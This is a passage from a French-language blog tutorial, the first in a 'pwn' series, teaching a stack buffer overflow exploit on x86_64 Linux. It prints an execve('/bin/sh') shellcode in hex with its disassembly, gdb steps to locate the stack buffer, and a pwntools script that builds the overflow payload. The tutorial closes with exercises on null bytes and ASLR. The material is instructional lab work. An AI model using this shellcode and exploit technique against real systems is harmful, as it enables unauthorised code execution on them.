<p>Petit tour sur <a href="http://shell-storm.org/shellcode/">shellstorm</a> ou <a href="https://www.exploit-db.com/">exploit-db</a>, choisir la bonne architecture, &hellip;</p>

<p>Pour ma part il est fait maison, ou plutôt refait maison, car l&rsquo;idée générale reste la même : Placer les bons paramètres dans les registres, puis déclencher un syscall pour que le kernel exécute ce que l&rsquo;on veut, ici un shell.</p>

<p>Shellcode :</p>

<p><code>\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05</code></p>

<p>On va quand même le désassembler pour comprendre ce qu&rsquo;il fait, et ce grâce à ce site : <a href="https://onlinedisassembler.com">https://onlinedisassembler.com</a></p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/shellcode.png" alt="shellcode" ></p>

<pre><code>0  : &quot;//bin/sh&quot; dans rax
A  : &quot;/bin/sh\x00&quot; dans rax
E  : mettre rax en pile
F  : rdi pointe vers la pile
12 : 0 dans rax
15 : 59 dans rax (execve)
17 : 0 dans rsi
1a : 0 dans rdx
1d : Initier le syscall
</code></pre>

<p>Ceci va donc exécuter <code>/bin/sh</code> à l&rsquo;aide du syscall de execve.</p>

<p>Les paramètres à utiliser sont trouvés à l&rsquo;aide de cette doc :<br />
<a href="https://w3challs.com/syscalls/?arch=x86_64">https://w3challs.com/syscalls/?arch=x86_64</a></p>

<h2 id="développement-de-l-exploit">Développement de l&rsquo;exploit</h2>

<p>On veut donc arriver à mettre notre shellcode à un endroit connu, puis atteindre une taille de 40 bytes pour y placer l&rsquo;adresse du shellcode à exécuter. Yapluka !</p>

<p>Notre payload (données envoyées lors de l&rsquo;attaque) aura donc la forme suivante :<br />
PADDING + SHELLCODE + ADRESSE_SHELLCODE</p>

<p>Afin de trouver où se situent les données entrées par l&rsquo;utilisateur, dans gdb :</p>

<p>On désassemble le main (convention de nom pour la fonction principale du programme), défini un point d&rsquo;arrêt avant la fin de l&rsquo;exécution, puis le lance avec AAAA en paramètre.</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/disas_main.png" alt="disas_main" ></p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/find.png" alt="find" ></p>

<p>Une fois arrêté, notre input se trouve donc dans la stack, à l&rsquo;adresse : 0x7fffffffe570</p>

<p>Et notre shellcode se trouvera un peu après l&rsquo;input, à cause du padding.</p>

<p>Code python de l&rsquo;exploit :</p>

<pre><code class="language-python">#!/usr/bin/env python2

from pwn import *

def save(what, where):
  with open(where, &quot;wb&quot;) as f:
    f.write(what)

shellcode = &quot;\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68&quot;
shellcode += &quot;\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31&quot;
shellcode += &quot;\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05&quot;

offset = 40
count_A = offset - len(shellcode)
padding = &quot;A&quot; * count_A
addr_input = 0x7fffffffe570 # Dépend de votre OS
addr_shellcode = addr_input + count_A
log.info(&quot;Shellcode at 0x{:8x}&quot;.format(addr_shellcode))

payload = padding + shellcode + p64(addr_shellcode)

save(payload, &quot;payload&quot;)
log.success(&quot;Payload written&quot;)
</code></pre>

<p>Pour lancer l&rsquo;exploit, il n&rsquo;y a plus qu&rsquo;à donner son output au programme en tant qu&rsquo;argument :</p>

<p><img class="img_full" src="/en/hacking/pwn_1of4_buffer_overflow/run_exploit.png" alt="run_exploit" ></p>

<p>Et BIM ! Spawned a shell ! <code>\o/</code></p>

<p><img class="img_small" src="/en/hacking/pwn_1of4_buffer_overflow/like_a_boss.png" alt="like_a_boss" ></p>

<h2 id="remarques-et-réflexion">Remarques et Réflexion :</h2>

<ul>
<li>Remarque 1</li>
</ul>

<p>Dans cet exemple, une erreur s&rsquo;est dissimulée, sauras tu la retrouver ?</p>

<p><em>-[ SPOIL ]-</em></p>

<p>Ce shellcode contient des null-bytes (<code>\x00</code>, sentinelle qui en C, désigne une fin de chaine de caractère) qui sont très mal gérés par bash. Si l&rsquo;argument avait été passé directement, bash l&rsquo;aurait coupé. Passer par un fichier permet de tout envoyer au programme, même les null-bytes. Mais ceci ne règle pas le problème en totalité. En effet, la fonction vulnérable ici est strcpy. Elle copie un string et s&rsquo;arrête à la première sentinelle (aka null-byte, aka 0x00, aka ShellCodeBreakerOfDoom). Notre exploit fonctionne quand même car ils apparaissent à la fin de notre payload en tant qu&rsquo;adresse. Et nous collons cette adresse de stack sur&hellip; Une adresse de stack, donc les 0x00 dont déjà présents.</p>

<p>Réflexion : Comment corriger le shellcode pour qu&rsquo;il n&rsquo;utilise plus de null-byte ?</p>

<ul>
<li>Remarque 2</li>
</ul>

<p>Cet exemple est limité car la taille disponible avant l&rsquo;EIP est très petite. Cela suffit pour pop un shell, mais pas pour bien plus. De plus, cet espace étant près des adresses utilisées, il est possible qu&rsquo;il soit altéré durant l&rsquo;exécution. Embêtant non ?</p>

<p>Réflexion : Comment utiliser un shellcode de taille arbitrairement longue ?</p>

<ul>
<li>Remarque 3</li>
</ul>

<p>Cet exemple ne fonctionne que si l&rsquo;ASLR est désactivé car il dépend fortement de la pile. Il existe de nombreuses facons de contourner l&rsquo;ASLR&hellip; Suite dans les prochains articles&hellip; Au compte goutte ! :D</p>

<p>Comment ? Tu as lu jusqu&rsquo;ici ? Chapal l&rsquo;ami !</p>

<p>T&rsquo;es un magicien, maintenant ! Ou presque&hellip; ;)</p>

<p><img class="img_small" src="/en/hacking/pwn_1of4_buffer_overflow/blair.png" alt="blair" ></p>

<p>Ceci étant mon premier article sur le sujet, je sais qu&rsquo;il sera incomplet, et plein d&rsquo;imprécisions si ce n&rsquo;est d&rsquo;erreurs. Vos retours sont donc bienvenus pour toute coquille trouvée, détail manquant, erreur, &hellip; <code>^.^</code></p>

<ul>
<li>Hints</li>
</ul>

<p>-Utiliser des&hellip; Xor ? Add ? Sub ? Autre ?<br />
-Variables d&rsquo;environnement ? Ordre du padding et du shellcode dans notre payload?</p>

<p>En espérant que ce premier pas dans le monde du pwn vous ait plu,</p>

  </div>
  

<div class="post--navigation post--navigation-single">
    
    
    <a href="/en/hacking/pwn_2of4_ret2libc/" class="post--navigation-next">
      <span class="navigation-tittle">PWN 2/4 : Return at libc, pick a shell !</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-128985075-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
  crossorigin="anonymous">
</script>


    
        
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    </body>
</html>
